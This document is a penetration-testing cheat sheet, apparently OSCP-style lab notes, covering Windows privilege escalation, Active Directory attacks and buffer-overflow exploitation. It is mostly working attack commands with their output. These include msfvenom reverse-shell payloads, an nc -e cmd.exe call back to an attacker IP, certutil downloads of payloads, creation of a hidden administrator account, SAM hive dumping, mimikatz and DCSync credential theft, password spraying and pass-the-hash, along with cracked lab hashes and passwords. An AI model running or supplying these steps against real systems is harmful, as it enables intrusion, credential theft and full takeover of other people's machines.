# Execute cmd /c C:\\Users\jess\Desktop\shell.exe
exec('cmd /c C:\\Users\jess\\Desktop\\shell.exe');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
````
nc -nlvp 443 
listening on [any] 443 ...
connect to [192.168.119.184] from (UNKNOWN) [10.11.1.252] 10209
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
jess\Admin
````
### Service Information Binary Exploitation
#### Winpeas - Interesting Services -non Microsoft-
````
auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload
File Permissions: Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\DevelopmentExectuables (Everyone [AllAccess], Authenticated Users [WriteData/CreateFiles])
````
````
icacls auditTracker.exe
auditTracker.exe Everyone:(I)(F)
		 BUILTIN\Admins:(I)(F)
		 NT AUTHORITY\SYSTEM:(I)(F)
		 BUILTIN\USERS:(I)(RX)
		 NT AUTHORITY\Authenticated Users:(I)(M)
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=443 -f exe -o auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> cerutil -urlcache -split -f http://192.168.119.138:80/auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables>sc.exe start audtiTracker
nc -nlvp 443
````
### Leveraging Unquoted Service Paths
Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.

As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. Most of the time, services that accompany third party software are stored under the C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.
#### cmd.exe
````
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
````
In this example we see than ZenHelpDesk is in program files as discussed before and has an unqouted path.
````
C:\Users\ted>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v """
mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql                          Auto       
ZenHelpDesk                                                                         Service1                                  C:\program files\zen\zen services\zen.exe                                                              Auto       

C:\Users\ted>
````
check our permission and chech which part of the path you have write access to.
````
dir /Q
dir /Q /S
````
````
C:\Program Files\Zen>dir /q
 Volume in drive C has no label.
 Volume Serial Number is 3A47-4458

 Directory of C:\Program Files\Zen

02/15/2021  02:00 PM    <DIR>          BUILTIN\Admins .
02/15/2021  02:00 PM    <DIR>          NT SERVICE\TrustedInsta..
02/10/2021  02:24 PM    <DIR>          BUILTIN\Admins Zen Services
03/10/2023  12:05 PM             7,168 EXAM\ted               zen.exe
               1 File(s)          7,168 bytes
               3 Dir(s)   4,013,879,296 bytes free
````
Next we want to create a msfvenom file for a reverse shell and upload it to the folder where we have privledges over a file to write to. Start your netcat listner and check to see if you have shutdown privledges
````
sc stop "Some vulnerable service" #if you have permission proceed below
sc start "Some vulnerable service"#if the above worked then start the service again
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
shutdown /r /t 0 #wait for a shell to comeback
````
#### Powershell service priv esc
##### Enumeration
````
https://juggernaut-sec.com/unquoted-service-paths/#:~:text=Enumerating%20Unquoted%20Service%20Paths%20by%20Downloading%20and%20Executing,bottom%20of%20the%20script%3A%20echo%20%27Invoke-AllChecks%27%20%3E%3E%20PowerUp.ps1 # follow this
````
````
cp /opt/PowerUp/PowerUp.ps1 .
````
````
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
````
````
Name               DisplayName                            StartMode PathName                                           
----               -----------                            --------- --------                                           
LSM                LSM                                    Unknown                                                      
NetSetupSvc        NetSetupSvc                            Unknown                                                      
postgresql-9.2     postgresql-9.2 - PostgreSQL Server 9.2 Auto      C:/exacqVisionEsm/PostgreSQL/9.2/bin/pg_ctl.exe ...
RemoteMouseService RemoteMouseService                     Auto      C:\Program Files (x86)\Remote Mouse\RemoteMouseS...
solrJetty          solrJetty                              Auto      C:\exacqVisionEsm\apache_solr/apache-solr\script...

````
````
move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe.bak"
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
````
````
get-service *exac*
stop-service ESMexampleService*
start-service ESMexampleService*
````
````
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
````


### Adding a user with high privs
````
net user hacker password /add
net localgroup Admins hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
[right click and run as Admin]
````
### SeImpersonate
#### JuicyPotatoNG
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
cp /opt/juicyPotato/JuicyPotatoNG.exe .
````
````
PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!



nc -nlvp 1337                                                                                                                     
listening on [any] 1337 ...
connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
````
#### PrintSpoofer
````
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````
````
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC

````
### Pivoting
#### psexec.py
Using credentials that we wound for USERC we were able to psexec.py on my kali machine using chisel to USERCs Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
````
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
````
````
C:\HFS>whoami
whoami
USERL\USERL
````
````
C:\Users\USERL\Desktop>net user USERL
Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
````
````
C:\Users\USERL\Desktop>net users
net users

User accounts for \\USERL

-------------------------------------------------------------------------------
Admin            USERC                    USERL                  
Guest                    
The command completed successfully
````
````
C:\Users\USERL\Desktop>net user USERC
Local Group Memberships      *Admins       
Global Group memberships     *None                 
The command completed successfully.
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
### third party cheat sheet
````
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
````
### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Enumeration
##### Initial Network scans
````
nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
````
##### Impacket
````
impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all 
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491
````
###### Creds
````
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
USERA                                              2020-11-04 00:35:05.106274  <never>             
USERB                                                2020-11-04 00:35:05.216273  <never>             
USERC                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.264272  <never>             
USERD                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.315273  <never>             
jUSERE                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.377272  <never>             
USERF                                                2020-11-04 00:35:05.216273  <never>                                                              2020-11-04 00:35:05.433274  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.492273  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.545279  <never>             
USERH                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.603273  <never>             
USERI                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.652273  <never>             
USERJ                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.703274  <never>             
USERK                                                 2020-11-04 00:35:05.216273  <never>                                                         2020-11-04 00:35:05.760273  <never>             
USERL                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
domainadmin                                           2021-02-16 00:24:22.190351  2023-05-19 16:58:10.073764
````
##### Bloodhound.py
````
/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
````
````
INFO: Found AD domain: exampleH.example
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (exampleH.example:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: exampleHdc.exampleH.example
INFO: Done in 00M 12S

````
#### Network commands
````
arp -a #look for IPs that your victim is connected
ipconfig #look for a dual victim machine, typically two $ips shown
````
#### User Hunting
````
net users #Local users
net users /domain #All users on Domain
net users jeff /domain #Queury for more infromation on each user
net group /domain #Enumerate all groups on the domain
net group "Music Department" / domain #Enumerating specific domain group for members
````
#### Credential hunting
##### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
````
````
tree /f C:\Users\ #look for interesting files, backups etc.
````
##### Sam, System, Security Files
````
whoami /all #BUILTIN\Admins
````
````
reg save hklm\security c:\security
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
copy C:\sam z:\loot
copy c:\security z:\loot
c:\system z:\loot
````
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
````
````
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
````
````
samdump2 SYSTEM SAM                                                                                                                     
*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
````
````
creddump7                       
creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### impacket-secretsdump
````
impacket-secretsdump Admin:'password'@$ip -outputfile hashes
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
````
$DCC2$10240#username#hash
````
````
$DCC2$10240#Admin#a7c5480e8c1ef0ffec54e99275e6e0f7
$DCC2$10240#luke#cd21be418f01f5591ac8df1fdeaa54b6
$DCC2$10240#warren#b82706aff8acf56b6c325a6c2d8c338a
$DCC2$10240#jess#464f388c3fe52a0fa0a6c8926d62059c
````
````
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt

This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
````
##### Powershell
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password password123"
````
##### PowerView
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-DomainUser 
Get-DomainUser | select cn
Get-NetGroup | select name
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
###### Errors
````
PS C:\> Import-Module .\PowerView.ps1
Import-Module : File C:\PowerView.ps1 cannot be loaded because running scripts is disabled on this system. For more 
information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
````
````
PS C:\> powershell -exec bypass #this is how to get around it
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

Import-Module .\PowerView.ps1
PS C:\> Import-Module .\PowerView.ps1
````
##### mimikatz.exe
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
or
https://github.com/allandev5959/mimikatz-2.1.1
unzip mimikatz_trunk.zip 
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
````
#### AD Lateral Movement
##### Network
````
nslookup #use this tool to internally find the next computer to pivot to.
example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
````
###### SMB
````
impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
````
###### WINRM
````
evil-winrm -u <user> -p <password> -i 172.16.138.83
evil-winrm -u <user> -H <hash> -i 172.16.138.83
````
###### WMI
````
proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
impacket-wmiexec forest/bob:'password'@172.16.138.10
````
###### RDP
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
###### Accessing shares with RDP
````
windows + R
type: \\172.16.120.21
Enter User Name
Enter Password
[now view shares via rdp session]
````
#### AD attacks
##### Spray and Pray
````
sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec smb 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
````
````
.\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
````
##### Pass-the-hash
````
crackmapexec smb 10.11.1.120-124 -u admin -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
crackmapexec smb 10.11.1.20-24 -u pat -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
crackmapexec smb 10.11.1.20-24 -u tim -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svexample.com -x whoami
proxychains crackmapexec smb 10.10.126.146 -u 'Admin' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d example.com
````
##### TGT Impersonation
````
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
````
##### AS-REP Roasting
````
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/USERP
````
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
type hashes.asreproast
````
###### Cracking AS-REP Roasting
````
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Kerberoasting
````
sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 example.com/user
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
````
###### Cracking Kerberoasting
````
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Domain Controller Synchronization
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
````

# Buffer overflow
------------------------
- Buffer overflow process, get this down.
    - NOTE: if registers disappears use "ALT+C" to get it back
    - Process
        1. Fuzz EIP: Run fuzzy with just one char for an amount of times. You 
           may need to use "\r\n" at the end for the values to take
            - Fuzzy location: ~/notes/exam/BOF/fuzzy2.py
        2. Create pattern: 
            > msf-pattern_create -l 800
        3. Determine offset 
            > msf-pattern_offset -l 800 -q 35724134
                - what ever value given is what "A" needs to be
            - Adjust fuzzer to use A+B+C to confirm 42424242 shows up in EIP
        4. Find bad chars
            - Run fuzzer now with only output of "badchars" AFTER the 'A's
            - Dump ESP (You may need to search for chars being sent)
            - Copy Immunity Debugger Hex dump output. Only copy characters that
              Need to be checked. Paste into a file on Kali.
                > BadCharChecker filename
            - Repeate until BadCharChecker gives finds all Bad chars.
        5. Find a JMP ESP address in Immunity
            - Run "!mona modules", find a dependency that has "FALSE" for all. 
              (Or at least the most FALSE's)
            - Run "!mona find -s "\xff\xe4" -m "dependencyfoundname.exe""
            - Make note of found address. Make sure address does not create a
              "00" on little endian
            - Convert to little endian and put in code "LEC 311712F3"
        6. Test with a breaker
            - Run "Go To address" (Button looks like ->| ). Enter the jmp esp address (Not little converted)
            - select F2 to add breaker
            - Start program F9
            - Run fuzzer now with A + eip + C
            - Make sure JMP ESP address shows up in EIP.
        7. Create shell code and exploit
            - see venom section
        8. Test exploit
            - Copy shell code over
            - Add nop sled (many \x90\x90.., up to 11-20 might need to play with this)
            - output A + eip + nop + shellcodeA
            - set up listener "nc -nlvp 4444"
            - Run exploit

        Uh oh... its not working..
            - Reset the debug machines and run through the process again, did JMP ESP change? adjust and try running again
            - Did you try adjusting your "new line" end? ("\r\n" or "\n"?)
            - try different encoding. You can leave off "-e x86/shikata_ga_nai" in your msfvenom command and an encoding will be auto selected
            - Try longer nop sled yet?
            - Change different reverse shell port
            - Restart the VPN, with new RS port

## Other info below for buffer overflow:
    - Check register hex values
        > msf-nasm_shell
    - Convert hex to ascii
        > echo <hex> | xxd -r -p
    - Linux gcc compiling commands
        > i686-w64-mingw32-gcc exploit.good2.c -o exploitc.asx -lws2_32

# Reading memory dumps:
-----------------------
- Volatility:
    > systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    > volatility kdbgscan -f SILO-20180105-221806.dmp
    > volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
    > volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
        - hash should now be obtained

# MSFvenom
----------
## NOTE: These sites are very helpful:
https://netsec.ws/?p=331
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

## msfvenom help
- msfvenom platforms (OS)
    > msfvenom --list platform
- msfvenom payloads (OS+specific reverse)
    > msfvenom --list payloads

## Best buffer overflow shell code rev shells
    - Windows:
        > msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.156 lport=4444 -f python -e x86/shikata_ga_nai -b "\x00\x0a"
    - Linux:
        > msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -b "\x00\x0a" -f py -v shellcode
## Windows Shell code
    - Windows 32bit single stage reverse, output shellcode python:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -f python -e x86/shikata_ga_nai -b "\x00\x0a"
        > msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f python -e x86/shikata_ga_nai -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    - Windows 32bit single stage reverse, output shellcode c:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x0a"
    - Windows 32bit single stage reverse, output raw output:
        > msfvenom -p windows/shell_reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=192.168.49.156 LPORT=443
    - Windows 64bit single stage reverse, output C# dll format
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
## Windows Perform command
    - Windows 64bit single stage reverse, perform command python:
        > msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 4445' -b '\x00\x0a\x0d' -f py -v payload
## Windows Single Stage
    - Winodws 64bit single stage reverse, output dll
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4445 -f dll -o hijackme.dll
    - Winodws 64bit single stage reverse, output msi
        > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.156 LPORT=4445 -f msi -o reverse.msi
    - Windows 32bit single stage reverse, output asp file:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=4444 -f asp -o 1337.asp
    - Windows 32bit single stage reverse, output exe file:
        > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.135 LPORT=8899 -f exe -o shellmeX86p8899.exe
